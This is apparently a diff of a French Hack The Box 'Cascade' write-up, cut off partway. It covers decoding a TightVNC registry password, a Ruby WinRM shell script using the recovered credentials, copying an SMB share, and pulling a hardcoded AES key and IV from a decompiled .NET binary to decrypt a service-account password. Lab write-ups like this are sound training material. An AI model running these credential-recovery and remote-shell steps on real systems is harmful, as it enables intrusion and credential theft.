-&quot;UseVncAuthentication&quot;=dword:00000001
-&quot;UseControlAuthentication&quot;=dword:00000000
-&quot;RepeatControlAuthentication&quot;=dword:00000000
-&quot;LoopbackOnly&quot;=dword:00000000
-&quot;AcceptHttpConnections&quot;=dword:00000001
-&quot;LogLevel&quot;=dword:00000000
-&quot;EnableFileTransfers&quot;=dword:00000001
-&quot;RemoveWallpaper&quot;=dword:00000001
-&quot;UseD3D&quot;=dword:00000001
-&quot;UseMirrorDriver&quot;=dword:00000001
-&quot;EnableUrlParams&quot;=dword:00000001
-&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
-&quot;AlwaysShared&quot;=dword:00000000
-&quot;NeverShared&quot;=dword:00000000
-&quot;DisconnectClients&quot;=dword:00000001
-&quot;PollingInterval&quot;=dword:000003e8
-&quot;AllowLoopback&quot;=dword:00000000
-&quot;VideoRecognitionInterval&quot;=dword:00000bb8
-&quot;GrabTransparentWindows&quot;=dword:00000001
-&quot;SaveLogToAllUsersPath&quot;=dword:00000000
-&quot;RunControlInterface&quot;=dword:00000001
-&quot;IdleTimeout&quot;=dword:00000000
-&quot;VideoClasses&quot;=&quot;&quot;
-&quot;VideoRects&quot;=&quot;&quot;
-</code></pre>
-
-<p>Cependant, les mots de passe utilisés par VNC sont connus pour ne pas être robustes. Il est en effet possible de déchiffrer ces derniers à l&rsquo;aide de différents outils. Dans le cas de cette machine, j&rsquo;ai utilisé un petit utilitaire Windows <code>vncpwd.exe</code>.</p>
-
-<pre><code class="language-bash">C:\vncpwd&gt;vncpwd.exe 6bcf2a4b6e5aca0f
+<span style="color:#f92672">[</span>HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\T</span>ightVNC<span style="color:#ae81ff">\S</span>erver<span style="color:#f92672">]</span>
+<span style="color:#e6db74">&#34;ExtraPorts&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#e6db74">&#34;QueryTimeout&#34;</span><span style="color:#f92672">=</span>dword:0000001e
+<span style="color:#e6db74">&#34;QueryAcceptOnTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;LocalInputPriorityTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000003
+<span style="color:#e6db74">&#34;LocalInputPriority&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;BlockRemoteInput&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;BlockLocalInput&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;IpAccessControl&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#e6db74">&#34;RfbPort&#34;</span><span style="color:#f92672">=</span>dword:0000170c
+<span style="color:#e6db74">&#34;HttpPort&#34;</span><span style="color:#f92672">=</span>dword:000016a8
+<span style="color:#e6db74">&#34;DisconnectAction&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;AcceptRfbConnections&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;UseVncAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;UseControlAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;RepeatControlAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;LoopbackOnly&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;AcceptHttpConnections&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;LogLevel&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;EnableFileTransfers&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;RemoveWallpaper&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;UseD3D&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;UseMirrorDriver&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;EnableUrlParams&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
+<span style="color:#e6db74">&#34;AlwaysShared&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;NeverShared&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;DisconnectClients&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;PollingInterval&#34;</span><span style="color:#f92672">=</span>dword:000003e8
+<span style="color:#e6db74">&#34;AllowLoopback&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;VideoRecognitionInterval&#34;</span><span style="color:#f92672">=</span>dword:00000bb8
+<span style="color:#e6db74">&#34;GrabTransparentWindows&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;SaveLogToAllUsersPath&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;RunControlInterface&#34;</span><span style="color:#f92672">=</span>dword:00000001
+<span style="color:#e6db74">&#34;IdleTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000000
+<span style="color:#e6db74">&#34;VideoClasses&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#e6db74">&#34;VideoRects&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</code></pre></div><p>Cependant, les mots de passe utilisés par VNC sont connus pour ne pas être robustes. Il est en effet possible de déchiffrer ces derniers à l&rsquo;aide de différents outils. Dans le cas de cette machine, j&rsquo;ai utilisé un petit utilitaire Windows <code>vncpwd.exe</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\v</span>ncpwd&gt;vncpwd.exe 6bcf2a4b6e5aca0f
 
 *VNC password decoder 0.2.1
 by Luigi Auriemma
 e-mail: aluigi@autistici.org
 web:    aluigi.org
 
-- your input password seems in hex format (or longer than 8 chars)
+- your input password seems in hex format <span style="color:#f92672">(</span>or longer than <span style="color:#ae81ff">8</span> chars<span style="color:#f92672">)</span>
 
   Password:   sT333ve2
 
   Press RETURN to exit
-</code></pre>
-
-<p>Un second mot de passe est récupéré ! Étant donné ce dernier et les noms des utilisateurs, il est probable qu&rsquo;il s&rsquo;agise de <code>s.smith</code>. Là, ça devient intéressant ! Rappelez vous, lors de l&rsquo;énumération, nous avons vu que les utilisateurs <code>s.smith</code> et <code>arksvc</code> font partie du groupe <code>Remote Management Users</code>. Cela veut entre autre dire qu&rsquo;ils ont les droits pour se connecter à distance via WinRM !</p>
-
+</code></pre></div><p>Un second mot de passe est récupéré ! Étant donné ce dernier et les noms des utilisateurs, il est probable qu&rsquo;il s&rsquo;agise de <code>s.smith</code>. Là, ça devient intéressant ! Rappelez vous, lors de l&rsquo;énumération, nous avons vu que les utilisateurs <code>s.smith</code> et <code>arksvc</code> font partie du groupe <code>Remote Management Users</code>. Cela veut entre autre dire qu&rsquo;ils ont les droits pour se connecter à distance via WinRM !</p>
 <p>On récupère donc notre petit script ruby, et en avant.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">require <span style="color:#e6db74">&#39;winrm&#39;</span>
 
-<pre><code class="language-bash">require 'winrm'
+conn <span style="color:#f92672">=</span> WinRM::Connection.new<span style="color:#f92672">(</span> 
+  endpoint: <span style="color:#e6db74">&#39;http://10.10.10.182:5985/wsman&#39;</span>,
+  user: <span style="color:#e6db74">&#39;CASCADE.LOCAL\s.smith&#39;</span>,
+  password: <span style="color:#e6db74">&#39;sT333ve2&#39;</span>,
+<span style="color:#f92672">)</span>
 
-conn = WinRM::Connection.new( 
-  endpoint: 'http://10.10.10.182:5985/wsman',
-  user: 'CASCADE.LOCAL\s.smith',
-  password: 'sT333ve2',
-)
+command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
 
-command=&quot;&quot;
-
-conn.shell(:powershell) do |shell|
-    until command == &quot;exit\n&quot; do
-        print &quot;PS &gt; &quot;
-        command = gets        
-        output = shell.run(command) do |stdout, stderr|
+conn.shell<span style="color:#f92672">(</span>:powershell<span style="color:#f92672">)</span> <span style="color:#66d9ef">do</span> |shell|
+    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit\n&#34;</span> <span style="color:#66d9ef">do</span>
+        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
+        command <span style="color:#f92672">=</span> gets        
+        output <span style="color:#f92672">=</span> shell.run<span style="color:#f92672">(</span>command<span style="color:#f92672">)</span> <span style="color:#66d9ef">do</span> |stdout, stderr|
             STDOUT.print stdout
             STDERR.print stderr
         end
     end    
-    puts &quot;Exiting with code #{output.exitcode}&quot;
+    puts <span style="color:#e6db74">&#34;Exiting with code #{output.exitcode}&#34;</span>
 end
 
-</code></pre>
-
-<p>Un joli shell utilisateur :)</p>
-
-<pre><code class="language-bash">$ ruby winrm_shell_s.smith.rb 
+</code></pre></div><p>Un joli shell utilisateur :)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_s.smith.rb 
 PS &gt; whoami
-cascade\s.smith
+cascade<span style="color:#ae81ff">\s</span>.smith
 PS &gt; pwd
 
 Path                      
 ----                      
-C:\Users\s.smith\Documents
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\D</span>ocuments
 
 
 PS &gt; type ../Desktop/user.txt
 a0**REDACTED**
-</code></pre>
-
-<p><br/></p>
-
-<h3 id="partage-audit-rétro-ingénierie-nouveau-compte">Partage &ldquo;Audit$&rdquo;, rétro-ingénierie &amp; nouveau compte</h3>
-
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="partage-audit-rétro-ingénierie--nouveau-compte">Partage &ldquo;Audit$&rdquo;, rétro-ingénierie &amp; nouveau compte</h3>
 <p>Disposant d&rsquo;un nouveau compte ayant des droits plus avantageux, le partage SMB <code>Audit$</code> devient accessible.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;s.smith&#34;</span> //10.10.10.182/Audit$
+Enter WORKGROUP<span style="color:#ae81ff">\s</span>.smith<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 19:01:26 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 19:01:26 <span style="color:#ae81ff">2020</span>
+  CascAudit.exe                       A    <span style="color:#ae81ff">13312</span>  Tue Jan <span style="color:#ae81ff">28</span> 22:46:51 <span style="color:#ae81ff">2020</span>
+  CascCrypto.dll                      A    <span style="color:#ae81ff">12288</span>  Wed Jan <span style="color:#ae81ff">29</span> 19:00:20 <span style="color:#ae81ff">2020</span>
+  DB                                  D        <span style="color:#ae81ff">0</span>  Tue Jan <span style="color:#ae81ff">28</span> 22:40:59 <span style="color:#ae81ff">2020</span>
+  RunAudit.bat                        A       <span style="color:#ae81ff">45</span>  Wed Jan <span style="color:#ae81ff">29</span> 00:29:47 <span style="color:#ae81ff">2020</span>
+  System.Data.SQLite.dll              A   <span style="color:#ae81ff">363520</span>  Sun Oct <span style="color:#ae81ff">27</span> 07:38:36 <span style="color:#ae81ff">2019</span>
+  System.Data.SQLite.EF6.dll          A   <span style="color:#ae81ff">186880</span>  Sun Oct <span style="color:#ae81ff">27</span> 07:38:38 <span style="color:#ae81ff">2019</span>
+  x64                                 D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 23:25:27 <span style="color:#ae81ff">2020</span>
+  x86                                 D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 23:25:27 <span style="color:#ae81ff">2020</span>
 
-<pre><code class="language-bash">$ smbclient -U &quot;s.smith&quot; //10.10.10.182/Audit$
-Enter WORKGROUP\s.smith's password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Wed Jan 29 19:01:26 2020
-  ..                                  D        0  Wed Jan 29 19:01:26 2020
-  CascAudit.exe                       A    13312  Tue Jan 28 22:46:51 2020
-  CascCrypto.dll                      A    12288  Wed Jan 29 19:00:20 2020
-  DB                                  D        0  Tue Jan 28 22:40:59 2020
-  RunAudit.bat                        A       45  Wed Jan 29 00:29:47 2020
-  System.Data.SQLite.dll              A   363520  Sun Oct 27 07:38:36 2019
-  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 07:38:38 2019
-  x64                                 D        0  Sun Jan 26 23:25:27 2020
-  x86                                 D        0  Sun Jan 26 23:25:27 2020
-
-    13106687 blocks of size 4096. 7794393 blocks available
-</code></pre>
-
-<p>Plusieurs éléments sont intéressants ici. Afin de faciliter l&rsquo;analyse, on télécharge l&rsquo;ensemble des fichiers du partage.</p>
-
-<pre><code class="language-bash">smb: \&gt; mask &quot;&quot;
-smb: \&gt; recurse ON
-smb: \&gt; mget *
+    <span style="color:#ae81ff">13106687</span> blocks of size 4096. <span style="color:#ae81ff">7794393</span> blocks available
+</code></pre></div><p>Plusieurs éléments sont intéressants ici. Afin de faciliter l&rsquo;analyse, on télécharge l&rsquo;ensemble des fichiers du partage.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\&gt;</span> mask <span style="color:#e6db74">&#34;&#34;</span>
+smb: <span style="color:#ae81ff">\&gt;</span> recurse ON
+smb: <span style="color:#ae81ff">\&gt;</span> mget *
 Get file CascAudit.exe? y
-getting file \CascAudit.exe of size 13312 as CascAudit.exe (25.3 KiloBytes/sec) (average 25.3 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\C</span>ascAudit.exe of size <span style="color:#ae81ff">13312</span> as CascAudit.exe <span style="color:#f92672">(</span>25.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 25.3 KiloBytes/sec<span style="color:#f92672">)</span>
 Get file CascCrypto.dll? y
-getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (28.4 KiloBytes/sec) (average 26.7 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\C</span>ascCrypto.dll of size <span style="color:#ae81ff">12288</span> as CascCrypto.dll <span style="color:#f92672">(</span>28.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 26.7 KiloBytes/sec<span style="color:#f92672">)</span>
 Get directory DB? y
 Get file Audit.db? y
-getting file \DB\Audit.db of size 24576 as Audit.db (56.7 KiloBytes/sec) (average 36.1 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\D</span>B<span style="color:#ae81ff">\A</span>udit.db of size <span style="color:#ae81ff">24576</span> as Audit.db <span style="color:#f92672">(</span>56.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 36.1 KiloBytes/sec<span style="color:#f92672">)</span>
 Get file RunAudit.bat? y
-getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 27.8 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\R</span>unAudit.bat of size <span style="color:#ae81ff">45</span> as RunAudit.bat <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 27.8 KiloBytes/sec<span style="color:#f92672">)</span>
 Get file System.Data.SQLite.dll? y
-getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (318.1 KiloBytes/sec) (average 140.2 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\S</span>ystem.Data.SQLite.dll of size <span style="color:#ae81ff">363520</span> as System.Data.SQLite.dll <span style="color:#f92672">(</span>318.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 140.2 KiloBytes/sec<span style="color:#f92672">)</span>
 Get file System.Data.SQLite.EF6.dll? y
-getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (105.7 KiloBytes/sec) (average 127.3 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\S</span>ystem.Data.SQLite.EF6.dll of size <span style="color:#ae81ff">186880</span> as System.Data.SQLite.EF6.dll <span style="color:#f92672">(</span>105.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 127.3 KiloBytes/sec<span style="color:#f92672">)</span>
 Get directory x64? y
 Get file SQLite.Interop.dll? y
-getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (457.7 KiloBytes/sec) (average 269.9 KiloBytes/sec)
+getting file <span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\S</span>QLite.Interop.dll of size <span style="color:#ae81ff">1639936</span> as SQLite.Interop.dll <span style="color:#f92672">(</span>457.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 269.9 KiloBytes/sec<span style="color:#f92672">)</span>
 Get directory x86? y
 Get file SQLite.Interop.dll? y
-getting file \x86\SQLite.Interop.dll of size 1246720 as SQLite.Interop.dll (422.0 KiloBytes/sec) (average 309.8 KiloBytes/sec)
-</code></pre>
-
-<p>Premier élément, une base de donnée SQLite.</p>
-
-<pre><code class="language-bash">$ file Audit.db 
-Audit.db: SQLite 3.x database, last written using SQLite version 3027002
-</code></pre>
-
-<p>Grâce à SQLite Browser, on peut ouvrir le fichier. La table <code>DeletedUserAudit</code> contient les entrées liées aux utilisateurs supprimés remarqués auparavant. La table LDAP contient les informations de connexion du compte utilisé par le service, à savoir <code>ArcSvc</code> !</p>
-
-<pre><code class="language-bash">id | uname  | pwd                      | domain
-1  | ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw== | cascade.local
-</code></pre>
-
-<p>Le mot de passe est chiffré, car la base64 ne donne rien. À partir de là, le fonctionnement rappelle une box compromise il n&rsquo;y a pas si longtemps&hellip; Nest =).
+getting file <span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\S</span>QLite.Interop.dll of size <span style="color:#ae81ff">1246720</span> as SQLite.Interop.dll <span style="color:#f92672">(</span>422.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 309.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>Premier élément, une base de donnée SQLite.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file Audit.db 
+Audit.db: SQLite 3.x database, last written using SQLite version <span style="color:#ae81ff">3027002</span>
+</code></pre></div><p>Grâce à SQLite Browser, on peut ouvrir le fichier. La table <code>DeletedUserAudit</code> contient les entrées liées aux utilisateurs supprimés remarqués auparavant. La table LDAP contient les informations de connexion du compte utilisé par le service, à savoir <code>ArcSvc</code> !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">id | uname  | pwd                      | domain
+<span style="color:#ae81ff">1</span>  | ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw<span style="color:#f92672">==</span> | cascade.local
+</code></pre></div><p>Le mot de passe est chiffré, car la base64 ne donne rien. À partir de là, le fonctionnement rappelle une box compromise il n&rsquo;y a pas si longtemps&hellip; Nest =).
 Le service utilise probablement les informations de la base de données afin de se connecter au domaine. Ainsi, il doit comporter une fonctionnalité lui permettant de déchiffrer le mot de passe.</p>
-
 <p>Il s&rsquo;avère que le binaire est écrit en <code>C# (.NET)</code>. Parfait ! Cela va grandement faciliter les choses&hellip; &ldquo;Reverse&rdquo; time !</p>
-
-<pre><code class="language-bash">$ file CascAudit.exe 
-CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
-</code></pre>
-
-<p>J&rsquo;ai utilisé <code>dnSpy</code> afin de décompiler l&rsquo;application. Globalement, c&rsquo;est moins compliqué que ça en a l&rsquo;air aux premiers abords.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file CascAudit.exe 
+CascAudit.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> Mono/.Net assembly, <span style="color:#66d9ef">for</span> MS Windows
+</code></pre></div><p>J&rsquo;ai utilisé <code>dnSpy</code> afin de décompiler l&rsquo;application. Globalement, c&rsquo;est moins compliqué que ça en a l&rsquo;air aux premiers abords.
 Au niveau du <code>main</code>, on observe le petit morceau de code qui s&rsquo;occupe du déchiffrement et de l&rsquo;authentification.</p>
-
-<pre><code class="language-bash">sqliteDataReader.Read();
-str = Conversions.ToString(sqliteDataReader[&quot;Uname&quot;]);
-str2 = Conversions.ToString(sqliteDataReader[&quot;Domain&quot;]);
-string encryptedString = Conversions.ToString(sqliteDataReader[&quot;Pwd&quot;]);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqliteDataReader.Read<span style="color:#f92672">()</span>;
+str <span style="color:#f92672">=</span> Conversions.ToString<span style="color:#f92672">(</span>sqliteDataReader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Uname&#34;</span><span style="color:#f92672">])</span>;
+str2 <span style="color:#f92672">=</span> Conversions.ToString<span style="color:#f92672">(</span>sqliteDataReader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Domain&#34;</span><span style="color:#f92672">])</span>;
+string encryptedString <span style="color:#f92672">=</span> Conversions.ToString<span style="color:#f92672">(</span>sqliteDataReader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Pwd&#34;</span><span style="color:#f92672">])</span>;
 try
-{
-  password = Crypto.DecryptString(encryptedString, &quot;c4scadek3y654321&quot;);
-}
-catch (Exception ex)
-{
-  Console.WriteLine(&quot;Error decrypting password: &quot; + ex.Message);
-  return;
-}
-</code></pre>
-
-<p>Celui ci fait appel à une fonction de déchiffrément, ainsi qu&rsquo;à une clé hardcodée.. Smells good huh ?
+<span style="color:#f92672">{</span>
+  password <span style="color:#f92672">=</span> Crypto.DecryptString<span style="color:#f92672">(</span>encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span><span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+catch <span style="color:#f92672">(</span>Exception ex<span style="color:#f92672">)</span>
+<span style="color:#f92672">{</span>
+  Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Error decrypting password: &#34;</span> + ex.Message<span style="color:#f92672">)</span>;
+  <span style="color:#66d9ef">return</span>;
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Celui ci fait appel à une fonction de déchiffrément, ainsi qu&rsquo;à une clé hardcodée.. Smells good huh ?
 Il est possible de récupérer la fonction de déchiffrement également.</p>
-
-<pre><code class="language-bash">public static string DecryptString(string EncryptedString, string Key)
-    {
-      byte[] array = Convert.FromBase64String(EncryptedString);
-      Aes aes = Aes.Create();
-      aes.KeySize = 128;
-      aes.BlockSize = 128;
-      aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);
-      aes.Mode = CipherMode.CBC;
-      aes.Key = Encoding.UTF8.GetBytes(Key);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">public static string DecryptString<span style="color:#f92672">(</span>string EncryptedString, string Key<span style="color:#f92672">)</span>
+    <span style="color:#f92672">{</span>
+      byte<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> Convert.FromBase64String<span style="color:#f92672">(</span>EncryptedString<span style="color:#f92672">)</span>;
+      Aes aes <span style="color:#f92672">=</span> Aes.Create<span style="color:#f92672">()</span>;
+      aes.KeySize <span style="color:#f92672">=</span> 128;
+      aes.BlockSize <span style="color:#f92672">=</span> 128;
+      aes.IV <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1tdyjCbY1Ix49842&#34;</span><span style="color:#f92672">)</span>;
+      aes.Mode <span style="color:#f92672">=</span> CipherMode.CBC;
+      aes.Key <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span>Key<span style="color:#f92672">)</span>;
       string @string;
-      using (MemoryStream memoryStream = new MemoryStream(array))
-      {
-        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
-        {
-          byte[] array2 = new byte[checked(array.Length - 1 + 1)];
-          cryptoStream.Read(array2, 0, array2.Length);
-          @string = Encoding.UTF8.GetString(array2);
-        }
-      }
-      return @string;
-    }
-</code></pre>
-
-<p>On est donc en mesure de déchiffrer notre mot de passe, en manipulant légèrement le code !
+      using <span style="color:#f92672">(</span>MemoryStream memoryStream <span style="color:#f92672">=</span> new MemoryStream<span style="color:#f92672">(</span>array<span style="color:#f92672">))</span>
+      <span style="color:#f92672">{</span>
+        using <span style="color:#f92672">(</span>CryptoStream cryptoStream <span style="color:#f92672">=</span> new CryptoStream<span style="color:#f92672">(</span>memoryStream, aes.CreateDecryptor<span style="color:#f92672">()</span>, CryptoStreamMode.Read<span style="color:#f92672">))</span>
+        <span style="color:#f92672">{</span>
+          byte<span style="color:#f92672">[]</span> array2 <span style="color:#f92672">=</span> new byte<span style="color:#f92672">[</span>checked<span style="color:#f92672">(</span>array.Length - <span style="color:#ae81ff">1</span> + 1<span style="color:#f92672">)]</span>;
+          cryptoStream.Read<span style="color:#f92672">(</span>array2, 0, array2.Length<span style="color:#f92672">)</span>;
+          @string <span style="color:#f92672">=</span> Encoding.UTF8.GetString<span style="color:#f92672">(</span>array2<span style="color:#f92672">)</span>;
+        <span style="color:#f92672">}</span>
+      <span style="color:#f92672">}</span>
+      <span style="color:#66d9ef">return</span> @string;
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>On est donc en mesure de déchiffrer notre mot de passe, en manipulant légèrement le code !
 Étant un peu noob, je ne me suis pas risqué à patcher le binaire puis le recompiler (Et surtout, j&rsquo;avais flemme et je connaissais une autre méthode).
 De la même façon que pour la machine <code>Nest</code>, le site <a href="https://dotnetfiddle.net">https://dotnetfiddle.net</a> va être d&rsquo;un grand secours !
 On intègre simplement la fonction de déchiffrement dans un petit programme et on affiche la valeur du mot de passe déchiffré.</p>
-
-<pre><code class="language-bash">using System;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
           
 public class Program
-{
-  public static void Main()
-  {
-    Console.WriteLine(&quot;Hello World&quot;);
-    Console.WriteLine(DecryptString(&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;, &quot;c4scadek3y654321&quot;));
-  }
-  public static string DecryptString(string EncryptedString, string Key)
-    {
-      byte[] array = Convert.FromBase64String(EncryptedString);
-      Aes aes = Aes.Create();
-      aes.KeySize = 128;
-      aes.BlockSize = 128;
-      aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);
-      aes.Mode = CipherMode.CBC;
-      aes.Key = Encoding.UTF8.GetBytes(Key);
+<span style="color:#f92672">{</span>
+  public static void Main<span style="color:#f92672">()</span>
+  <span style="color:#f92672">{</span>
+    Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello World&#34;</span><span style="color:#f92672">)</span>;
+    Console.WriteLine<span style="color:#f92672">(</span>DecryptString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;BQO5l5Kj9MdErXx6Q6AGOw==&#34;</span>, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span><span style="color:#f92672">))</span>;
+  <span style="color:#f92672">}</span>
+  public static string DecryptString<span style="color:#f92672">(</span>string EncryptedString, string Key<span style="color:#f92672">)</span>
+    <span style="color:#f92672">{</span>
+      byte<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> Convert.FromBase64String<span style="color:#f92672">(</span>EncryptedString<span style="color:#f92672">)</span>;
+      Aes aes <span style="color:#f92672">=</span> Aes.Create<span style="color:#f92672">()</span>;
+      aes.KeySize <span style="color:#f92672">=</span> 128;
+      aes.BlockSize <span style="color:#f92672">=</span> 128;
+      aes.IV <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1tdyjCbY1Ix49842&#34;</span><span style="color:#f92672">)</span>;
